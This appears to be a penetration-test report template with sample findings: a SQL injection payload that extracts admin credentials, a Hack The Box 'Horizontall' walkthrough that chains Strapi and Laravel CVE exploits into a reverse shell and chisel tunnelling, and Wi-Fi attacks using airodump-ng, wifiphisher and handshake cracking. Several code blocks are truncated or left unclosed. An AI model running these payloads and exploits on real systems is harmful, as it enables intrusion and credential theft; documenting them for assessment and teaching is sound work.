#### Description

SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database by adding a string of malicious code to a database query.

#### Impact

An attacker can obtain, modify and delete any information stored in the database.

#### Proof of Concept

By changing the value of the id parameter with  `-1 UNION (SELECT 1,2,3)`, we can insert values that will be later shown on the server's response.

![UNION SQLi](Images/image-20220423165201295.png)

Finally, it was possible to obtain the admin's credentials with the following payload.

```bash
http://localhost/index.php?id=-1%20UNION%20(SELECT%20id,%20email,%20password%20from%20users%20where%20id=1)
```

![Admin credentials](Images/image-20220423165719395.png){width=250px .fragile}

#### Mitigations

`<NAME OF ASSESSING COMPANY>` recommends patching the vulnerability by using prepared SQL statements with parameterized queries, user input validation and enforcing the principle of least privilege.

## Internal pentesting

### Enumeration

First of all, a port scan with **Nmap** was performed on the host to obtain the available services.

```bash
kali@kali:~/Documents/HTB/Horizontall$ sudo nmap -sS -p- -n -T5 -oN AllPorts.txt 10.129.167.200
Nmap scan report for 10.129.167.200
Host is up (0.11s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

# Nmap done at Mon Aug 30 09:06:45 2021 -- 1 IP address (1 host up) scanned in 176.68 seconds
```

Then, a deeper scan of each opened port was performed, getting more information about each service.

```bash
kali@kali:~/Documents/HTB/Horizontall$ sudo nmap -sC -sV -n -T5 -oN PortsDepth.txt -p 22,80 10.129.167.200
Nmap scan report for 10.129.167.200
Host is up (0.11s latency).

```

The nmap output provides us with the domain `horizontall.htb`, adding this to the `/etc/hosts` we have access to the web page.

![Horizontall Web page](Images/image-20210830151941478.png)

Looking for virtual hosts on the web server with **gobuster** a new virtual host was found.

```bash
kali@kali:~/Documents/HTB/Horizontall$ gobuster vhost -o subdomains.txt -t 40 -w //usr/share/wordlists/SecLists/Discovery/DNS/./subdomains-top1million-110000.txt -u http://horizontall.htb/

Inside the `/admin` directory there is an **strapi** [login](http://api-prod.horizontall.htb/admin/auth/login) page.

![Strapi login page](Images/image-20210830234316362.png)

With the following command, we can check the **strapi** version for a later CVE search.

```bash
kali@kali:~/Documents/HTB/Horizontall$ curl http://api-prod.horizontall.htb/admin/strapiVersion; echo
{"strapiVersion":"3.0.0-beta.17.4"}
```

### Exploitation

Looking on google there is a [post](https://thatsn0tmysite.wordpress.com/2019/11/15/x05/) about how to exploit the [**CVE-2019-18818**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2019-18818), resetting the administration password knowing the admin's email.

```bash
kali@kali:~/Documents/HTB/Horizontall$ python3 CVE-2019-18818.py admin@horizontall.htb http://api-prod.horizontall.htb 1234
[*] Detected version(GET /admin/strapiVersion): 3.0.0-beta.17.4

```

In order to obtain a reverse shell, another CVE is needed, looking on google again web appears this [exploit](https://raw.githubusercontent.com/dasithsv/CVE-2019-19609/main/exploit.py) for the **CVE-2019-19609**. 

Putting it all together, a reverse shell as "strapi" can be obtained.

```bash
kali@kali:~/Documents/HTB/Horizontall$ python exploit.py api-prod.horizontall.htb 10.10.14.82 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMwMzQ0Nzc4LCJleHAiOjE2

### Post-Exploitation - Privilege Escalation

Enumerating the machine, there are some services running on **localhost**. 

```bash
strapi@horizontall:~/myapi$ netstat -putona
Active Internet connections (servers and established)

```

In order to access the localhost listening ports, [chisel](https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_linux_amd64.gz) was used to do **port forwarding**. 

```bash
kali@kali:~/UTILS$ ./chisel server -p 4444 --reverse

Now,  it is possible to access the **laravel** web page.

![Laravel web page](Images/image-20210830215341207.png)

Looking exploits for Laravel v8 appears the vulnerability **CVE-2021-3129** with the following [exploit](https://raw.githubusercontent.com/ambionics/laravel-exploits/main/laravel-ignition-rce.py). Nonetheless, the library **[PHPGGC](https://github.com/ambionics/phpggc)** is needed to create a payload. In this case, the payload obtains a file from the system.

```bash
kali@kali:~/Documents/HTB/Horizontall$ git clone https://github.com/ambionics/phpggc.git
Cloning into 'phpggc'...

```

Finally, executing the exploit the file is retrieved from the system.

```bash

#### Description 

During the wireless assessment were found the insecure encryption process "OPEN" and the authentication method "PSK".

#### Impact 

Due to the **OPEN** encryption process, wireless traffic is being transmitted without any kind of encryption. Thus, any sensitive information transmitted without an extra layer of encryption like HTTPS, TLS or SSH could be read by any attacker that stays in the area.

The **PSK** authentication protocol is not designed for companies because it allows an attacker to easily obtain the WIFI password, allowing it to sniff traffic from all devices and access the internal network.

#### Proof of Concept

```bash
kali@kali:~/Documents/WIFI-Pentest$ sudo airodump-ng wlan0
 CH  1 ][ Elapsed: 0 s ][ 2022-08-18 05:43

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 [...]
```

#### Mitigations 

Both networks should use WPA2-Enterprise, defaulting the attacker sniffing traffic and getting access to the network.

##### Description 
\leavevmode \newline

As shown on the Proof Of Conception section on \ref{InsecureProtocols} \nameref{InsecureProtocols}, the access points ESSID are not very generic. 

##### Impact 
\leavevmode \newline

Generic ESSID makes it easier for attackers to identify which access points to target.

##### Proof of Concept

##### Description 
\leavevmode \newline

During the assessment, fake access points were set up, and deauthentication attacks were made against the APs. However, no fake access point was pulled down, and no alarm was triggered.

##### Impact 
\leavevmode \newline

The company APs could be constantly under constant attack, and no employee from the company could notice it.

##### Proof of Concept
\leavevmode \newline

Using **wifiphisher** the fake AP "WIFICorp" was created.

```bash
kali@kali:~$ sudo wifiphisher -e "WIFICorp" -aI wlan0 -nE -p firmware-upgrade

##### Description 
\leavevmode \newline

A signal coverage test was performed to check the signal strength of the different access points around the building. 

It was discovered that was possible to get access to the wireless network outside the building.

In order to understand the relation between the power and the expected quality check *\ref{wifi_power_explanation} \nameref{wifi_power_explanation}*

##### Impact 
\leavevmode \newline

Attackers do not need to be inside the building to perform wireless attacks.

##### Proof of Concept  
\leavevmode \newline

This is the map of the building from the outside, where each number represents the places where the samples were taken.

As I side note, the value of the power column, the closest to 0, the stronger the signal is.

**Point 1**:

| ESSID             | BSSID             | Power |
| ----------------- | ----------------- | ----- |
| WifiCorp          | XX:XX:XX:XX:XX:XX | -25   |

##### Description 
\leavevmode \newline

During the assessment, a WPA handshake for the network WifiCorp was found, and it could be cracked.

##### Impact 
\leavevmode \newline

An attacker can decrypt the data transmitted wirelessly, obtain sensitive data and also it can access the internal network.

##### Proof of concept 
\leavevmode \newline

Sniffing packets from the network a handshake is captured.

| ------------------------------------ | ---------- | ------------------------------------------------------------ |
| \textcolor{Critical}{Critical}       | 9.0 - 10.0 | The vulnerability poses an immediate threat to the organisation. Successful exploitation may permanently affect the organisation. Remediation should be immediately performed. |
| \textcolor{High}{High}               | 7.0 â€“ 8.9  | The vulnerability poses an urgent threat to the organisation, and remediation should be prioritised. |
| \textcolor{Medium}{Medium}           | 4.0 â€“ 6.9  | Successful exploitation is possible and may result in notable disruption of business functionality. This vulnerability should be remediated when feasible. |
| \textcolor{Low}{Low}                 | 0.1 â€“ 3.9  | The vulnerability poses a negligible/minimal threat to the organisation. The presence of this vulnerability should be noted and remediated if possible. |
| \textcolor{Informative}{Informative} | 0.0        | The vulnerability poses little or no threat to the organization. The presence of this vulnerability is more to inform the customer than to be a real threat. |

## Vulnerability states

The vulnerabilities can be in one of the following states:

* **Potential**: The vulnerability has been identified but its exploitation has not been possible, so its existence cannot be fully verified, and it is up to the client to determine the impact.

* **Active**: The vulnerability has been identified and it has been possible to verify its existence.

## WiFi: Power & Expected quality

\label{wifi_power_explanation}

The relationship between power and the expected WiFi quality can be seen in this table:

|     Power     | Expected quality |
| :-----------: | :--------------: |
|  >= -50 dBm   |    Excellent     |
| ]-50,-60] dBm |    Very good     |
| ]-60,-70] dBm |       Good       |
| ]-70,-85] dBm |       Weak       |
|   < -85 dBm   |       Poor       |
